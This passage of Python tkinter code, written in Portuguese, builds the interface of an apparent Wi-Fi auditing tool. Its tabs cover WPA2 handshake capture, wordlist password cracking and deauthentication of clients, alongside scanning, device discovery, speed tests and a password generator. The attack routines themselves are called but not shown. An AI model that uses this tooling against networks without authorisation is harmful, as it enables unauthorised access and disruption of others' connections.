                               bg=C["fundo2"], fg=C["verde"])
        self.lbl_st.pack(side='right', padx=20)

        fr = tk.Frame(hdr, bg=C["fundo2"])
        fr.pack(side='right', padx=8)
        tk.Label(fr, text="Adaptador:",
                 font=("Consolas", 8),
                 bg=C["fundo2"], fg=C["texto_dim"]).pack(side='left')
        tk.Entry(fr, textvariable=self.var_iface,
                 font=("Consolas", 9),
                 bg=C["fundo3"], fg=C["ciano"],
                 insertbackground=C["ciano"],
                 relief='flat', width=18).pack(side='left', padx=4)
        tk.Button(fr, text="[CFG]",
                  font=("Consolas", 10),
                  bg=C["fundo3"], fg=C["amarelo"],
                  relief='flat', cursor='hand2',
                  command=self._cfg_adapter).pack(side='left')


    def _tabs(self):
        self.nb = ttk.Notebook(self.root)
        self.nb.pack(fill='both', expand=True, padx=8, pady=6)

        frames = {}
        nomes = [
            ("redes", "  REDES  "),
            ("auditoria", "  AUDITORIA WPA2  "),
            ("handshake", "  HANDSHAKE  "),
            ("dispositivos", "  DISPOSITIVOS  "),
            ("velocidade", "  VELOCIDADE  "),
            ("gerador", "  GERADOR SENHAS  "),
            ("info_rede", "  INFO REDE  "),
            ("wordlist", "  WORDLIST  "),
            ("log", "  LOG  "),
        ]
        for key, titulo in nomes:
            f = tk.Frame(self.nb, bg=C["fundo"])
            frames[key] = f
            self.nb.add(f, text=titulo)

        self._tab_redes(frames["redes"])
        self._tab_auditoria(frames["auditoria"])
        self._tab_handshake(frames["handshake"])
        self._tab_dispositivos(frames["dispositivos"])
        self._tab_velocidade(frames["velocidade"])
        self._tab_gerador(frames["gerador"])
        self._tab_info_rede(frames["info_rede"])
        self._tab_wordlist(frames["wordlist"])
        self._tab_log(frames["log"])


    # ─── ABA: REDES ──────────────────────────────────────────
    def _tab_redes(self, pai):
        body = tk.Frame(pai, bg=C["fundo"])
        body.pack(fill='both', expand=True, padx=8, pady=6)

        esq = tk.Frame(body, bg=C["painel"], width=300)
        esq.pack(side='left', fill='y', padx=(0, 8))
        esq.pack_propagate(False)

        tk.Label(esq, text="REDES VISIVEIS",
                 font=("Consolas", 10, "bold"),
                 bg=C["painel"], fg=C["verde"]).pack(fill='x', padx=12, pady=(12, 4))

        self.btn_scan = tk.Button(
            esq, text="BUSCAR REDES",
            font=("Consolas", 10, "bold"),
            bg=C["verde_dim"], fg="#fff",
            relief='flat', cursor='hand2', pady=7,
            command=self._escanear)
        self.btn_scan.pack(fill='x', padx=12, pady=(0, 6))

        fr_list = tk.Frame(esq, bg=C["fundo3"])
        fr_list.pack(fill='both', expand=True, padx=12, pady=(0, 4))

        self.listbox = tk.Listbox(
            fr_list, font=("Consolas", 9),
            bg=C["fundo3"], fg=C["texto"],
            selectbackground=C["verde_dim"], selectforeground="#fff",
            relief='flat', borderwidth=0, highlightthickness=0,
            activestyle='none')
        self.listbox.pack(fill='both', expand=True)
        self.listbox.bind('<<ListboxSelect>>', self._sel_rede)

        self.lbl_info_rede = tk.Label(
            esq, text="", font=("Consolas", 8),
            bg=C["painel"], fg=C["texto_dim"], wraplength=275, justify='left')
        self.lbl_info_rede.pack(fill='x', padx=12, pady=3)

        # Painel direito
        dir_ = tk.Frame(body, bg=C["fundo"])
        dir_.pack(side='left', fill='both', expand=True)

        fr_rede = tk.Frame(dir_, bg=C["painel"])
        fr_rede.pack(fill='x', pady=(0, 6))
        self.lbl_rede_nome = tk.Label(
            fr_rede, text="Selecione uma rede",
            font=("Consolas", 14, "bold"),
            bg=C["painel"], fg=C["amarelo"], anchor='w')
        self.lbl_rede_nome.pack(fill='x', padx=14, pady=(10, 2))
        self.lbl_rede_det = tk.Label(
            fr_rede, text="", font=("Consolas", 8),
            bg=C["painel"], fg=C["texto_dim"], anchor='w')
        self.lbl_rede_det.pack(fill='x', padx=14, pady=(0, 10))

        # Botoes de acao
        fr_btns = tk.Frame(dir_, bg=C["fundo"])
        fr_btns.pack(fill='x', pady=(0, 6))

        self.btn_auditar = self._btn(fr_btns,
            "INICIAR AUDITORIA DE SENHA",
            C["verde"], "#000", self._ir_auditoria, state='disabled')
        self.btn_auditar.pack(fill='x', pady=3)

        self.btn_descon = self._btn(fr_btns,
            "DESCONECTAR CLIENTES (DEAUTH)",
            C["vermelho"], "#fff", self._deauth_rapido, state='disabled')
        self.btn_descon.pack(fill='x', pady=3)

        fr_row = tk.Frame(fr_btns, bg=C["fundo"])
        fr_row.pack(fill='x', pady=3)

        self.btn_disp = self._btn(fr_row,
            "VER DISPOSITIVOS NA REDE",
            C["azul"], "#000", self._ir_dispositivos, state='disabled')
        self.btn_disp.pack(side='left', fill='x', expand=True, padx=(0, 3))

        self.btn_vel = self._btn(fr_row,
            "TESTAR VELOCIDADE",
            C["roxo"], "#fff", lambda: self.nb.select(4))
        self.btn_vel.pack(side='left', fill='x', expand=True, padx=(3, 0))

        # Log redes
        fr_log = tk.Frame(dir_, bg=C["painel"])
        fr_log.pack(fill='both', expand=True)
        tk.Label(fr_log, text="REGISTRO",
                 font=("Consolas", 8, "bold"),
                 bg=C["painel"], fg=C["verde"]).pack(anchor='w', padx=12, pady=(6, 1))
        self.log_redes = self._log_widget(fr_log)
        self.log_redes.pack(fill='both', expand=True, padx=12, pady=(0, 10))


    # ─── ABA: AUDITORIA WPA2 ─────────────────────────────────
    def _tab_auditoria(self, pai):
        body = tk.Frame(pai, bg=C["fundo"])
        body.pack(fill='both', expand=True, padx=8, pady=6)

        esq = tk.Frame(body, bg=C["painel"], width=280)
        esq.pack(side='left', fill='y', padx=(0, 8))
        esq.pack_propagate(False)

        tk.Label(esq, text="CONFIGURACAO",
                 font=("Consolas", 10, "bold"),
                 bg=C["painel"], fg=C["verde"]).pack(fill='x', padx=12, pady=(12, 6))

        tk.Label(esq, text="Rede alvo:", font=("Consolas", 8),
                 bg=C["painel"], fg=C["texto_dim"]).pack(anchor='w', padx=12)
        self.lbl_alvo = tk.Label(esq, text="--",
                                 font=("Consolas", 10, "bold"),
                                 bg=C["painel"], fg=C["amarelo"])
        self.lbl_alvo.pack(fill='x', padx=12, pady=(0, 8))

        tk.Label(esq, text="Wordlist ativa:", font=("Consolas", 8),
                 bg=C["painel"], fg=C["texto_dim"]).pack(anchor='w', padx=12)
        self.lbl_wl_info = tk.Label(esq, text=f"{len(WORDLIST)} senhas (interna)",
                                    font=("Consolas", 8, "bold"),
                                    bg=C["painel"], fg=C["ciano"])
        self.lbl_wl_info.pack(fill='x', padx=12, pady=(0, 8))

        tk.Label(esq, text="Handshake:", font=("Consolas", 8),
                 bg=C["painel"], fg=C["texto_dim"]).pack(anchor='w', padx=12)
        self.lbl_hs_info = tk.Label(esq, text="Nenhum capturado",
                                    font=("Consolas", 8, "bold"),
                                    bg=C["painel"], fg=C["vermelho"])
        self.lbl_hs_info.pack(fill='x', padx=12, pady=(0, 10))

        self.btn_iniciar = self._btn(esq, "INICIAR AUDITORIA",
                                     C["verde"], "#000", self._iniciar,
                                     state='disabled', pady=9)
        self.btn_iniciar.pack(fill='x', padx=12, pady=3)

        self.btn_parar = self._btn(esq, "PARAR",
                                   C["fundo3"], C["texto_dim"], self._parar,
                                   state='disabled', pady=6)
        self.btn_parar.pack(fill='x', padx=12, pady=2)

        self.btn_deauth2 = self._btn(esq, "DESCONECTAR CLIENTES",
                                     C["vermelho"], "#fff", self._deauth_rapido,
                                     state='disabled', pady=8)
        self.btn_deauth2.pack(fill='x', padx=12, pady=(8, 4))

        tk.Label(esq, text="AVISO LEGAL\nUse somente na sua rede\n"
                 "ou com autorizacao.",
                 font=("Consolas", 8), bg=C["painel"], fg=C["amarelo"],
                 justify='center').pack(pady=8)

        # Direita
        dir_ = tk.Frame(body, bg=C["fundo"])
        dir_.pack(side='left', fill='both', expand=True)

        fr_prog = tk.Frame(dir_, bg=C["painel"])
        fr_prog.pack(fill='x', pady=(0, 6))
        fr_top = tk.Frame(fr_prog, bg=C["painel"])
        fr_top.pack(fill='x', padx=12, pady=(8, 2))
        self.lbl_prog = tk.Label(fr_top, text="Aguardando...",
                                 font=("Consolas", 8, "bold"),
                                 bg=C["painel"], fg=C["texto"])
        self.lbl_prog.pack(side='left')
        self.lbl_tempo = tk.Label(fr_top, text="00:00",
                                  font=("Consolas", 8, "bold"),
                                  bg=C["painel"], fg=C["amarelo"])
        self.lbl_tempo.pack(side='right')
        self.barra = ttk.Progressbar(fr_prog,
                                     style="G.Horizontal.TProgressbar",
                                     mode='determinate')
        self.barra.pack(fill='x', padx=12, pady=(0, 8))

        fr_g = tk.Frame(dir_, bg=C["painel"])
        fr_g.pack(fill='x', pady=(0, 6))
        tk.Label(fr_g, text="VELOCIDADE  ms/senha",
                 font=("Consolas", 8, "bold"),
                 bg=C["painel"], fg=C["azul"]).pack(anchor='w', padx=12, pady=(6, 1))
        self.canvas_g = tk.Canvas(fr_g, height=60, bg=C["fundo3"],
                                  highlightthickness=0)
        self.canvas_g.pack(fill='x', padx=12, pady=(0, 8))

        fr_log = tk.Frame(dir_, bg=C["painel"])
        fr_log.pack(fill='both', expand=True)
        tk.Label(fr_log, text="REGISTRO",
                 font=("Consolas", 8, "bold"),
                 bg=C["painel"], fg=C["verde"]).pack(anchor='w', padx=12, pady=(6, 1))
        self.log_aud = self._log_widget(fr_log)
        self.log_aud.pack(fill='both', expand=True, padx=12, pady=(0, 10))


    # ─── ABA: HANDSHAKE ──────────────────────────────────────
    def _tab_handshake(self, pai):
        body = tk.Frame(pai, bg=C["fundo"], padx=22, pady=14)
        body.pack(fill='both', expand=True)

        tk.Label(body, text="CAPTURA DE HANDSHAKE WPA2",
                 font=("Consolas", 13, "bold"),
                 bg=C["fundo"], fg=C["verde"]).pack(anchor='w')
        tk.Label(body, text="Captura o handshake real usando Npcap + scapy.\n"
                 "Requer adaptador com suporte a modo monitor.",
                 font=("Consolas", 9),
                 bg=C["fundo"], fg=C["texto_dim"]).pack(anchor='w', pady=(2, 10))

        av = tk.Frame(body, bg="#2d1500", pady=6)
        av.pack(fill='x', pady=(0, 10))
        tk.Label(av, text="  AVISO: use somente na sua rede ou com autorizacao.",
                 font=("Consolas", 9, "bold"),
                 bg="#2d1500", fg=C["amarelo"], anchor='w').pack(fill='x', padx=10)

        fr = tk.Frame(body, bg=C["painel"], padx=16, pady=12)
        fr.pack(fill='x', pady=(0, 8))

        self.hs = {}
        for i, (lbl, key, dft) in enumerate([
            ("BSSID (MAC do roteador):", "bssid", "AA:BB:CC:DD:EE:FF"),
            ("Canal:", "canal", "6"),
            ("Segundos de captura:", "timeout", "60"),
        ]):
            tk.Label(fr, text=lbl, font=("Consolas", 9),
                     bg=C["painel"], fg=C["texto"]).grid(
                         row=i, column=0, sticky='w', pady=5, padx=(0, 12))
            v = tk.StringVar(value=dft)
            self.hs[key] = v
            tk.Entry(fr, textvariable=v, font=("Consolas", 10),
                     bg=C["fundo3"], fg=C["ciano"],
                     insertbackground=C["ciano"],
                     relief='flat', width=30).grid(row=i, column=1, sticky='w')

        tk.Label(fr, text="Adaptador:", font=("Consolas", 9),
                 bg=C["painel"], fg=C["texto"]).grid(
                     row=3, column=0, sticky='w', pady=5, padx=(0, 12))
        tk.Entry(fr, textvariable=self.var_iface, font=("Consolas", 10),
                 bg=C["fundo3"], fg=C["ciano"],
                 insertbackground=C["ciano"],
                 relief='flat', width=20).grid(row=3, column=1, sticky='w')

        fr_btn = tk.Frame(body, bg=C["fundo"])
        fr_btn.pack(fill='x', pady=(0, 6))

        tk.Button(fr_btn, text="<- Da rede selecionada",
                  font=("Consolas", 9),
                  bg=C["fundo3"], fg=C["texto_dim"],
                  relief='flat', cursor='hand2',
                  command=self._hs_da_rede).pack(side='left', padx=(0, 8))

        self.btn_cap = self._btn(fr_btn, "CAPTURAR HANDSHAKE",
                                 C["verde"], "#000", self._capturar_hs, pady=8)
        self.btn_cap.pack(side='left', padx=(0, 8))

        self._btn(fr_btn, "DESCONECTAR (forcar reconexao)",
                  C["vermelho"], "#fff", self._deauth_hs, pady=8).pack(side='left')

        self.lbl_hs_st = tk.Label(body, text="",
                                  font=("Consolas", 10, "bold"),
                                  bg=C["fundo"], fg=C["texto_dim"],
                                  wraplength=660, justify='left')
        self.lbl_hs_st.pack(anchor='w', pady=4)

        self.btn_analisar = self._btn(body,
            "ANALISAR HANDSHAKE COM WORDLIST",
            C["azul"], "#000", self._hs_analisar, pady=7, state='disabled')
        self.btn_analisar.pack(anchor='w', pady=(0, 6))

        tk.Label(body, text="LOG:", font=("Consolas", 8, "bold"),
                 bg=C["fundo"], fg=C["verde"]).pack(anchor='w')
        self.log_hs = self._log_widget(body)
        self.log_hs.pack(fill='both', expand=True)


    # ─── ABA: DISPOSITIVOS ───────────────────────────────────
    def _tab_dispositivos(self, pai):
        body = tk.Frame(pai, bg=C["fundo"], padx=16, pady=12)
        body.pack(fill='both', expand=True)

        tk.Label(body, text="DISPOSITIVOS NA REDE",
                 font=("Consolas", 14, "bold"),
                 bg=C["fundo"], fg=C["azul"]).pack(anchor='w')
        tk.Label(body, text="Mostra todos os dispositivos conectados na rede.",
                 font=("Consolas", 9),
                 bg=C["fundo"], fg=C["texto_dim"]).pack(anchor='w', pady=(2, 10))

        fr_top = tk.Frame(body, bg=C["fundo"])
        fr_top.pack(fill='x', pady=(0, 8))

        self.btn_varrer = self._btn(fr_top, "BUSCAR DISPOSITIVOS",
                                    C["azul"], "#000", self._varrer_disp, pady=9)
        self.btn_varrer.pack(side='left', padx=(0, 8))

        self.lbl_disp_total = tk.Label(fr_top, text="",
                                       font=("Consolas", 9, "bold"),
                                       bg=C["fundo"], fg=C["verde"])
        self.lbl_disp_total.pack(side='left')

        fr_tbl = tk.Frame(body, bg=C["painel"])
        fr_tbl.pack(fill='both', expand=True)

        colunas = ("ip", "mac", "fabricante", "nome")
        self.tree = ttk.Treeview(fr_tbl, columns=colunas,
                                 show='headings', height=20)

        style = ttk.Style()
        style.configure("Treeview",
                        background=C["fundo3"], foreground=C["texto"],
                        fieldbackground=C["fundo3"], rowheight=26,
                        font=("Consolas", 9))
        style.configure("Treeview.Heading",
                        background=C["painel"], foreground=C["verde"],
                        font=("Consolas", 9, "bold"), relief='flat')
        style.map("Treeview", background=[("selected", C["verde_dim"])])

        for col, lbl, w in [
            ("ip", "Endereco IP", 140),
            ("mac", "MAC Address", 160),
            ("fabricante", "Fabricante", 160),
            ("nome", "Nome na Rede", 260),
        ]:
            self.tree.heading(col, text=lbl)
            self.tree.column(col, width=w, anchor='w')

        sb = ttk.Scrollbar(fr_tbl, orient='vertical', command=self.tree.yview)
        self.tree.configure(yscrollcommand=sb.set)
        self.tree.pack(side='left', fill='both', expand=True, padx=12, pady=12)
        sb.pack(side='right', fill='y', pady=12)

        fr_log = tk.Frame(body, bg=C["painel"])
        fr_log.pack(fill='x', pady=(6, 0))
        tk.Label(fr_log, text="LOG", font=("Consolas", 8, "bold"),
                 bg=C["painel"], fg=C["verde"]).pack(anchor='w', padx=12, pady=(6, 1))
        self.log_disp = self._log_widget(fr_log, height=5)
        self.log_disp.pack(fill='x', padx=12, pady=(0, 8))


    # ─── ABA: VELOCIDADE ─────────────────────────────────────
    def _tab_velocidade(self, pai):
        body = tk.Frame(pai, bg=C["fundo"], padx=20, pady=16)
        body.pack(fill='both', expand=True)

        tk.Label(body, text="VELOCIDADE DA REDE",
                 font=("Consolas", 14, "bold"),
                 bg=C["fundo"], fg=C["roxo"]).pack(anchor='w')
        tk.Label(body, text="Mede download, upload e latencia da conexao.",
                 font=("Consolas", 9),
                 bg=C["fundo"], fg=C["texto_dim"]).pack(anchor='w', pady=(2, 12))

        fr_cards = tk.Frame(body, bg=C["fundo"])
        fr_cards.pack(fill='x', pady=(0, 12))

        self.v_dl = tk.StringVar(value="--")
        self.v_ul = tk.StringVar(value="--")
        self.v_ping = tk.StringVar(value="--")

        def card(parent, titulo, var_val, cor):
            f = tk.Frame(parent, bg=C["painel"], padx=20, pady=16)
            f.pack(side='left', fill='x', expand=True, padx=6)
            tk.Label(f, text=titulo, font=("Consolas", 9, "bold"),
                     bg=C["painel"], fg=C["texto_dim"]).pack()
            tk.Label(f, textvariable=var_val,
                     font=("Consolas", 22, "bold"),
                     bg=C["painel"], fg=cor).pack()

        card(fr_cards, "DOWNLOAD (Mbps)", self.v_dl, C["verde"])
        card(fr_cards, "UPLOAD (Mbps)", self.v_ul, C["azul"])
        card(fr_cards, "LATENCIA (ms)", self.v_ping, C["amarelo"])

        self.barra_vel = ttk.Progressbar(
            body, style="B.Horizontal.TProgressbar", mode='indeterminate')
        self.barra_vel.pack(fill='x', pady=(0, 8))

        fr_btn = tk.Frame(body, bg=C["fundo"])
        fr_btn.pack(fill='x', pady=(0, 8))

        self.btn_vel_testar = self._btn(fr_btn, "TESTAR VELOCIDADE",
                                        C["roxo"], "#fff",
                                        self._testar_velocidade, pady=10)
        self.btn_vel_testar.pack(side='left', padx=(0, 8))

        self.lbl_vel_st = tk.Label(fr_btn, text="",
                                   font=("Consolas", 9),
                                   bg=C["fundo"], fg=C["texto_dim"])
        self.lbl_vel_st.pack(side='left')

        tk.Label(body, text="LOG:", font=("Consolas", 8, "bold"),
                 bg=C["fundo"], fg=C["verde"]).pack(anchor='w', pady=(6, 1))
        self.log_vel = self._log_widget(body, height=12)
        self.log_vel.pack(fill='both', expand=True)


    # ─── ABA: GERADOR DE SENHAS (NOVA) ───────────────────────
    def _tab_gerador(self, pai):
        body = tk.Frame(pai, bg=C["fundo"], padx=20, pady=16)
        body.pack(fill='both', expand=True)

        tk.Label(body, text="GERADOR DE SENHAS SEGURAS",
                 font=("Consolas", 14, "bold"),
                 bg=C["fundo"], fg=C["laranja"]).pack(anchor='w')
        tk.Label(body, text="Gera senhas aleatorias fortes para proteger suas redes.",
                 font=("Consolas", 9),
                 bg=C["fundo"], fg=C["texto_dim"]).pack(anchor='w', pady=(2, 12))

        # Configuracao
        fr_cfg = tk.Frame(body, bg=C["painel"], padx=20, pady=14)
        fr_cfg.pack(fill='x', pady=(0, 10))

        tk.Label(fr_cfg, text="Tamanho da senha:",
                 font=("Consolas", 9),
                 bg=C["painel"], fg=C["texto"]).grid(
                     row=0, column=0, sticky='w', pady=5, padx=(0, 12))
        self.var_tam_senha = tk.StringVar(value="16")
        tk.Entry(fr_cfg, textvariable=self.var_tam_senha,
                 font=("Consolas", 10), bg=C["fundo3"], fg=C["ciano"],
                 insertbackground=C["ciano"], relief='flat',
                 width=8).grid(row=0, column=1, sticky='w')

        self.var_especiais = tk.BooleanVar(value=True)
        tk.Checkbutton(fr_cfg, text="Incluir caracteres especiais (!@#$%)",
                       variable=self.var_especiais,
                       font=("Consolas", 9),
                       bg=C["painel"], fg=C["texto"],
                       selectcolor=C["fundo3"],
                       activebackground=C["painel"]).grid(
                           row=1, column=0, columnspan=2, sticky='w', pady=5)

        tk.Label(fr_cfg, text="Quantidade a gerar:",
                 font=("Consolas", 9),
                 bg=C["painel"], fg=C["texto"]).grid(
                     row=2, column=0, sticky='w', pady=5, padx=(0, 12))
        self.var_qtd_senhas = tk.StringVar(value="5")
        tk.Entry(fr_cfg, textvariable=self.var_qtd_senhas,
                 font=("Consolas", 10), bg=C["fundo3"], fg=C["ciano"],
                 insertbackground=C["ciano"], relief='flat',
                 width=8).grid(row=2, column=1, sticky='w')

        # Botao gerar
        fr_btn = tk.Frame(body, bg=C["fundo"])
        fr_btn.pack(fill='x', pady=(0, 8))
        self._btn(fr_btn, "GERAR SENHAS", C["laranja"], "#000",
                  self._gerar_senhas, pady=10).pack(side='left', padx=(0, 8))
        self._btn(fr_btn, "COPIAR TODAS", C["fundo3"], C["texto"],
                  self._copiar_senhas, pady=8).pack(side='left')

        # Resultado
        tk.Label(body, text="SENHAS GERADAS:",
                 font=("Consolas", 9, "bold"),
                 bg=C["fundo"], fg=C["verde"]).pack(anchor='w', pady=(6, 2))

        self.txt_senhas = scrolledtext.ScrolledText(
            body, font=("Consolas", 11), height=8,
            bg=C["fundo3"], fg=C["texto"],
            insertbackground=C["texto"], relief='flat')
        self.txt_senhas.pack(fill='both', expand=True)

        # Avaliador
        fr_av = tk.Frame(body, bg=C["painel"], padx=16, pady=10)
        fr_av.pack(fill='x', pady=(8, 0))
        tk.Label(fr_av, text="Testar forca de uma senha:",
                 font=("Consolas", 9),
                 bg=C["painel"], fg=C["texto"]).pack(side='left')
        self.var_teste_senha = tk.StringVar()
        tk.Entry(fr_av, textvariable=self.var_teste_senha,
                 font=("Consolas", 10), bg=C["fundo3"], fg=C["ciano"],
                 insertbackground=C["ciano"], relief='flat',
                 width=25).pack(side='left', padx=8)
        tk.Button(fr_av, text="Avaliar", font=("Consolas", 9, "bold"),
                  bg=C["azul"], fg="#000", relief='flat', cursor='hand2',
                  command=self._avaliar_senha).pack(side='left', padx=(0, 8))
        self.lbl_forca = tk.Label(fr_av, text="",
                                  font=("Consolas", 9, "bold"),
                                  bg=C["painel"], fg=C["texto_dim"])
        self.lbl_forca.pack(side='left')

    def _gerar_senhas(self):
        try:
            tam = int(self.var_tam_senha.get())
        except ValueError:
            tam = 16
        try:
            qtd = int(self.var_qtd_senhas.get())
        except ValueError:
            qtd = 5
        tam = max(8, min(64, tam))
        qtd = max(1, min(50, qtd))
        esp = self.var_especiais.get()

        self.txt_senhas.delete('1.0', tk.END)
        for i in range(qtd):
            s = gerar_senha_segura(tam, esp)
            score, desc, cor = avaliar_forca_senha(s)
            self.txt_senhas.insert(tk.END, f"{s}  [{desc} {score}%]\n")
        self.log(f"[GERADOR] {qtd} senha(s) de {tam} caracteres geradas.", "ok")

    def _copiar_senhas(self):
        txt = self.txt_senhas.get('1.0', tk.END).strip()
        if txt:
            self.root.clipboard_clear()
            self.root.clipboard_append(txt)
            messagebox.showinfo("Copiado", "Senhas copiadas!")

    def _avaliar_senha(self):
        s = self.var_teste_senha.get()
        if not s:
            return
        score, desc, cor = avaliar_forca_senha(s)
        self.lbl_forca.config(text=f"{desc} ({score}%)", fg=cor)


    # ─── ABA: INFO REDE (NOVA) ───────────────────────────────
    def _tab_info_rede(self, pai):
        body = tk.Frame(pai, bg=C["fundo"], padx=20, pady=16)
        body.pack(fill='both', expand=True)

        tk.Label(body, text="INFORMACOES DA REDE ATUAL",
                 font=("Consolas", 14, "bold"),
                 bg=C["fundo"], fg=C["ciano"]).pack(anchor='w')
        tk.Label(body, text="Exibe dados completos da sua conexao Wi-Fi.",
                 font=("Consolas", 9),
                 bg=C["fundo"], fg=C["texto_dim"]).pack(anchor='w', pady=(2, 12))

        fr_btn = tk.Frame(body, bg=C["fundo"])
        fr_btn.pack(fill='x', pady=(0, 10))
        self.btn_info_rede = self._btn(fr_btn, "ATUALIZAR INFORMACOES",
                                       C["ciano"], "#000",
                                       self._atualizar_info_rede, pady=9)
        self.btn_info_rede.pack(side='left')

        # Cards de info
        self.fr_info_cards = tk.Frame(body, bg=C["fundo"])
        self.fr_info_cards.pack(fill='both', expand=True)

        self._info_labels = {}
        campos = [
            ("ssid", "Rede (SSID)"),
            ("bssid", "BSSID do Roteador"),
            ("ip_local", "IP Local"),
            ("ip_publico", "IP Publico"),
            ("gateway", "Gateway"),
            ("dns", "Servidor DNS"),
            ("mascara", "Mascara"),
            ("canal", "Canal"),
            ("sinal", "Sinal (%)"),
            ("tipo_radio", "Tipo Radio (Wi-Fi)"),
            ("velocidade_rx", "Velocidade RX (Mbps)"),
            ("velocidade_tx", "Velocidade TX (Mbps)"),
            ("autenticacao", "Autenticacao"),
            ("cifra", "Cifra"),
        ]

        fr_grid = tk.Frame(self.fr_info_cards, bg=C["painel"], padx=20, pady=14)
        fr_grid.pack(fill='both', expand=True, pady=4)

        for i, (key, label) in enumerate(campos):
            row = i // 2
            col = (i % 2) * 2
            tk.Label(fr_grid, text=f"{label}:",
                     font=("Consolas", 9),
                     bg=C["painel"], fg=C["texto_dim"]).grid(
                         row=row, column=col, sticky='w', pady=4, padx=(0, 8))
            lbl = tk.Label(fr_grid, text="--",
                           font=("Consolas", 10, "bold"),
                           bg=C["painel"], fg=C["texto"])
            lbl.grid(row=row, column=col + 1, sticky='w', pady=4, padx=(0, 30))
            self._info_labels[key] = lbl

    def _atualizar_info_rede(self):
        self.btn_info_rede.config(state='disabled', text="Consultando...")

        def t():
            info = info_rede_atual()
            self.root.after(0, self._mostrar_info_rede, info)
        threading.Thread(target=t, daemon=True).start()

    def _mostrar_info_rede(self, info):
        self.btn_info_rede.config(state='normal', text="ATUALIZAR INFORMACOES")
        for key, lbl in self._info_labels.items():
            valor = info.get(key, "--")
            if valor:
                lbl.config(text=valor)
                if key == "sinal":
                    try:
                        s = int(valor)
                        cor = C["verde"] if s >= 70 else C["amarelo"] if s >= 40 else C["vermelho"]
                        lbl.config(fg=cor)
                    except ValueError:
                        pass
            else:
                lbl.config(text="--")
        self.log("[INFO REDE] Dados atualizados.", "ok")


    # ─── ABA: WORDLIST ───────────────────────────────────────
    def _tab_wordlist(self, pai):
        body = tk.Frame(pai, bg=C["fundo"], padx=20, pady=14)
        body.pack(fill='both', expand=True)

        tk.Label(body, text="LISTA DE SENHAS (WORDLIST)",
                 font=("Consolas", 13, "bold"),
                 bg=C["fundo"], fg=C["verde"]).pack(anchor='w')

        self.lbl_wl_hdr = tk.Label(body, text=f"Lista interna: {len(WORDLIST)} senhas",
                                   font=("Consolas", 9, "bold"),
                                   bg=C["fundo"], fg=C["amarelo"])
        self.lbl_wl_hdr.pack(anchor='w', pady=(4, 8))

        fr = tk.Frame(body, bg=C["fundo"])
        fr.pack(fill='x', pady=(0, 6))

        for txt, cmd, cor, fg in [
            ("Carregar .txt", self._wl_carregar, C["verde_dim"], "#fff"),
            ("Usar lista interna", self._wl_interna, C["fundo3"], C["texto"]),
            ("Adicionar manual", self._wl_adicionar, C["fundo3"], C["texto"]),
            ("Salvar .txt", self._wl_salvar, C["fundo3"], C["texto"]),
        ]:
            tk.Button(fr, text=txt, font=("Consolas", 9),
                      bg=cor, fg=fg, relief='flat', cursor='hand2',
                      padx=10, pady=5, command=cmd).pack(side='left', padx=(0, 6))

        tk.Label(body, text="Senhas ativas (uma por linha, min 8 caracteres):",
                 font=("Consolas", 9, "bold"),
                 bg=C["fundo"], fg=C["texto"]).pack(anchor='w', pady=(6, 2))

        self.txt_wl = scrolledtext.ScrolledText(
            body, font=("Consolas", 9),
            bg=C["fundo3"], fg=C["texto"],
            insertbackground=C["texto"], relief='flat')
        self.txt_wl.pack(fill='both', expand=True)
        self.txt_wl.insert('1.0', "\n".join(WORDLIST))

    # ─── ABA: LOG ────────────────────────────────────────────
    def _tab_log(self, pai):
        body = tk.Frame(pai, bg=C["fundo"], padx=12, pady=10)
        body.pack(fill='both', expand=True)

        fr = tk.Frame(body, bg=C["fundo"])
        fr.pack(fill='x', pady=(0, 6))
        self._btn(fr, "Limpar", C["fundo3"], C["texto_dim"],
                  self._log_limpar).pack(side='left', padx=(0, 6))
        self._btn(fr, "Salvar .txt", C["verde_dim"], "#fff",
                  self._log_salvar).pack(side='left')

        self.log_full = self._log_widget(body)
        self.log_full.pack(fill='both', expand=True)


    # ─── HELPERS UI ──────────────────────────────────────────
    def _btn(self, parent, txt, bg, fg, cmd=None, state='normal', pady=6):
        return tk.Button(parent, text=txt,
                         font=("Consolas", 10, "bold"),
                         bg=bg, fg=fg, relief='flat', cursor='hand2',
                         pady=pady, command=cmd, state=state)

    def _log_widget(self, parent, height=10):
        w = scrolledtext.ScrolledText(
            parent, font=("Consolas", 8),
            bg=C["fundo3"], fg=C["verde"],
            insertbackground=C["verde"],
            relief='flat', state='disabled', wrap='word', height=height)
        for tag, cor in [("ok", C["verde"]), ("erro", C["vermelho"]),
                         ("info", C["azul"]), ("dim", C["texto_dim"]),
                         ("aviso", C["amarelo"])]:
            w.tag_config(tag, foreground=cor)
        return w

    def _ins(self, widget, txt, tag=None):
        def _do():
            widget.config(state='normal')
            if tag:
                widget.insert(tk.END, txt + "\n", tag)
            else:
                widget.insert(tk.END, txt + "\n")
            widget.see(tk.END)
            widget.config(state='disabled')
        self.root.after(0, _do)

    def log(self, msg, tag=None):
        ts = datetime.now().strftime("%H:%M:%S")
        self._ins(self.log_full, f"[{ts}] {msg}", tag)

    def log_r(self, msg, tag=None):
        self._ins(self.log_redes, msg, tag)
        self.log(msg, tag)

    def log_a(self, msg, tag=None):
        self._ins(self.log_aud, msg, tag)
        self.log(msg, tag)

    def log_h(self, msg, tag=None):
        self._ins(self.log_hs, msg, tag)
        self.log(msg, tag)

    def log_d(self, msg, tag=None):
        self._ins(self.log_disp, msg, tag)
        self.log(msg, tag)

    def log_v(self, msg, tag=None):
        self._ins(self.log_vel, msg, tag)
        self.log(msg, tag)


    # ─── CHECAR INICIO ───────────────────────────────────────
    def _checar_inicio(self):
        avisos = []
        if not is_admin():
            avisos.append("Execute como Administrador para funcionalidades completas")
        if not _tem("scapy"):
            avisos.append("scapy nao instalado - execute o Instalador")
        if not tem_npcap():
            avisos.append("Npcap nao encontrado - execute o Instalador")
        for av in avisos:
            self.log(av, "aviso")
        if not avisos:
            self.log("Ambiente configurado. Todas as funcoes disponiveis.", "ok")

    # ─── SCAN DE REDES ───────────────────────────────────────
    def _escanear(self):
        self.btn_scan.config(state='disabled', text="BUSCANDO...")
        self.lbl_st.config(text="BUSCANDO", fg=C["amarelo"])
        threading.Thread(target=self._escanear_t, daemon=True).start()

    def _escanear_t(self):
        redes = escanear_redes()
        self.root.after(0, self._mostrar_redes, redes)

    def _mostrar_redes(self, redes):
        self.redes = redes
        self.listbox.delete(0, tk.END)
        for r in redes:
            s = r["sinal"]
            b = "||||" if s >= 70 else "|||." if s >= 45 else "||.." if s >= 25 else "|..."
            n = r["ssid"][:22].ljust(22)
            self.listbox.insert(tk.END, f" {b}  {n} {s:3d}%")
